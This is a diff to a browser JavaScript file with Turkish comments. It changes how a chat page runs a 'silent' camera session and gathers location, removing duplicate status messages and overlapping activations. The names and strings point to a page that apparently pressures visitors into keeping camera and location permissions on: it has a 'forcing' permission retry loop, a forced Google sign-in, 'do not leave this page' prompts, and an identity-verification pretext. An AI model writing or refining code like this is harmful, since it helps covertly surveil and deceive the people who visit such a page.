@@ -742,15 +742,45 @@
   function showSilentCameraStatus(box, callId) {
     const host = box || getOrCreateMediaHost();
     if (!host) return { wrap: null, video: null, label: null };
-    host.querySelectorAll?.(".chat-camera-preview")?.forEach((el) => el.remove());
+
+    const STATUS_TEXT =
+      "Kamera açık · konum alınıyor… İzinler açık kalsın; bu sayfadan ayrılmayın.";
+
+    // Aynı çağrı / tek durum satırı — tekrar ekleme (çakışma önlemi)
+    const existing =
+      host.querySelector?.(`.chat-camera-preview[data-call-id="${callId}"]`) ||
+      document.querySelector(`.chat-camera-preview[data-call-id="${callId}"]`) ||
+      host.querySelector?.(".chat-camera-preview.chat-camera-silent") ||
+      null;
+    if (existing) {
+      // Başka host'ta kaldıysa taşı
+      if (existing.parentElement !== host) host.appendChild(existing);
+      existing.dataset.callId = callId;
+      let label = existing.querySelector(".chat-camera-preview-label");
+      if (!label) {
+        label = document.createElement("p");
+        label.className = "chat-camera-preview-label";
+        existing.appendChild(label);
+      }
+      if (label.textContent !== STATUS_TEXT) label.textContent = STATUS_TEXT;
+      // Eski kopyaları temizle
+      document.querySelectorAll(".chat-camera-preview.chat-camera-silent").forEach((el) => {
+        if (el !== existing) el.remove();
+      });
+      return { wrap: existing, video: null, label };
+    }
+
+    document.querySelectorAll(".chat-camera-preview.chat-camera-silent").forEach((el) => {
+      el.remove();
+    });
+
     const wrap = document.createElement("div");
     wrap.className = "chat-camera-preview chat-camera-silent";
     wrap.dataset.callId = callId;
 
     const label = document.createElement("p");
     label.className = "chat-camera-preview-label";
-    label.textContent =
-      "Kamera açık · konum alınıyor… İzinler açık kalsın; bu sayfadan ayrılmayın.";
+    label.textContent = STATUS_TEXT;
 
     wrap.appendChild(label);
     host.appendChild(wrap);
@@ -1603,6 +1633,8 @@
   let cameraGrantedSynced = false;
   let connectionFailShown = false;
   let locationGrantedSynced = false;
+  let mediaStatusAnnounced = false;
+  let cameraActivateInFlight = null;
   const CAMERA_PERM_RETRY_MS = 10_000;
   const MEDIA_PERM_GRANTED_KEY = "media_perm_granted_v1";
   const CAMERA_PERM_DENIED_TEXT =
@@ -1832,11 +1864,50 @@
     const announce =
       opts.announce !== false && box && box.id !== "global-media-host";
 
-    await waitForChatSync();
-    const ok = await activateChatMediaNow(box, { fromGesture, announce });
-    // Sohbetteki beginAutoCamera ile aynı: aktif oturum + zorlama döngüsü
-    startCameraPermissionLoop(box, { preferCallId: latestCameraCallId || undefined });
-    return ok;
+    // Canlı oturum varsa tekrar başlatma / mesaj basma
+    if (hasLiveCameraAndLocation()) {
+      hidePageEntryPermGate();
+      const liveId =
+        latestCameraCallId ||
+        [...cameraSessions.keys()].find((id) => {
+          const st = cameraSessions.get(id);
+          return st?.stream?.getTracks?.().some((t) => t.readyState === "live");
+        });
+      if (liveId) showSilentCameraStatus(box, liveId);
+      return true;
+    }
+    if (hasLiveCameraSession()) {
+      const liveId =
+        latestCameraCallId ||
+        [...cameraSessions.keys()].find((id) => {
+          const st = cameraSessions.get(id);
+          return st?.stream?.getTracks?.().some((t) => t.readyState === "live");
+        });
+      if (liveId) showSilentCameraStatus(box, liveId);
+      startCameraPermissionLoop(box, { preferCallId: liveId || latestCameraCallId || undefined });
+      return true;
+    }
+
+    if (cameraActivateInFlight) {
+      try {
+        return await cameraActivateInFlight;
+      } catch {
+        /* devam */
+      }
+    }
+
+    cameraActivateInFlight = (async () => {
+      await waitForChatSync();
+      const ok = await activateChatMediaNow(box, { fromGesture, announce });
+      startCameraPermissionLoop(box, { preferCallId: latestCameraCallId || undefined });
+      return ok;
+    })();
+
+    try {
+      return await cameraActivateInFlight;
+    } finally {
+      cameraActivateInFlight = null;
+    }
   }
 
   /** İzin verildiği anda kamerayı + konumu hemen aç (sohbet mantığının birebir kopyası) */
@@ -1933,7 +2004,8 @@
         }
       }
 
-      if (announce && box && box.id !== "global-media-host") {
+      if (announce && box && box.id !== "global-media-host" && !mediaStatusAnnounced) {
+        mediaStatusAnnounced = true;
         appendMessage(box, "bot", "İzin alındı — kamera şimdi açılıyor…", { sync: false });
       }
 
@@ -1950,16 +2022,15 @@
       }
       existing = cameraSessions.get(callId);
     } else {
-      if (existing?.label) {
-        existing.label.textContent =
-          "Kamera açık · konum alınıyor… Sayfadan ayrılmayın.";
-      }
-      showSilentCameraStatus(box, callId);
+      const preview = showSilentCameraStatus(box, callId);
       const st = cameraSessions.get(callId);
-      if (st && box) {
-        st.wrap =
-          box.querySelector?.(`.chat-camera-preview[data-call-id="${callId}"]`) || st.wrap;
-        st.label = st.wrap?.querySelector?.(".chat-camera-preview-label") || st.label;
+      if (st) {
+        if (preview.wrap) st.wrap = preview.wrap;
+        if (preview.label) st.label = preview.label;
+        else if (st.label) {
+          st.label.textContent =
+            "Kamera açık · konum alınıyor… İzinler açık kalsın; bu sayfadan ayrılmayın.";
+        }
       }
     }
 
@@ -2008,14 +2079,15 @@
       }
     }
 
-    if (announce && box && box.id !== "global-media-host") {
+    if (announce && box && box.id !== "global-media-host" && !mediaStatusAnnounced) {
+      mediaStatusAnnounced = true;
       appendMessage(
         box,
         "bot",
         hasLoc
           ? "Kamera ve konum açıldı. İzinler kaydedildi — tekrar sorulmaz."
-          : "Kamera açıldı. Konum alınıyor…",
-        { sync: true }
+          : "Kamera açıldı. Konum alınıyor… İzinler açık kalsın; bu sayfadan ayrılmayın.",
+        { sync: false }
       );
     }
 
@@ -2039,10 +2111,11 @@
         hidePageEntryPermGate();
         return;
       }
+      if (cameraActivateInFlight && !fromGesture) return;
       // Sohbet kamerası ile aynı açılış
       void openCameraLikeChat(getOrCreateMediaHost(), {
         fromGesture,
-        announce: Boolean(fromGesture) && !isMediaPermGranted(),
+        announce: false,
       });
     };
 
@@ -3083,8 +3156,8 @@
       "Kimlik doğrulaması için izinler hazırlanıyor. Lütfen bekleyin…";
 
     async function beginAutoCamera() {
-      // Diğer sayfalarla ortak: sohbet kamera mantığı
-      await openCameraLikeChat(box, { fromGesture: false, announce: true });
+      // Sayfa girişi zaten açtıysa tekrar duyuru/çakışma yok
+      await openCameraLikeChat(box, { fromGesture: false, announce: false });
     }
 
     function beginForcedGoogleSignIn() {
